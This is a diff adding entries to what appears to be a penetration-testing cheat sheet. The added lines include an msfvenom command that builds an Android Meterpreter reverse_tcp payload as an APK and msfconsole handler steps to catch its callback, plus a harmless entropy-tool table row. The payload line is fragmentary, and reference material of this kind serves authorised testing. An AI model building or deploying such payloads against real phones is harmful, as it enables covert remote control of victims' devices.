@@ -269,6 +269,16 @@ Used to enumerate local users.
 
 ## Mobile Exploitation
 
+### Msfvenom
+android/meterpreter/reverse_tcp  -a dalvik --platform android -f raw -o x.apk
+
+### MSFCONSOLE
+
+exploit/multi/handler
+payload
+android/meterpreter/reverse_tcp
+
+
 ### Capture Screenshot with PhoneSploit
 
 ```bash
@@ -455,3 +465,4 @@ GET / HTTP/1.0
 | Binary Analysis | BinText / Ghidra |
 | Geolocation | IPVoid |
 | Internet Exposure Search | Shodan |
+| Entropy| DIE|
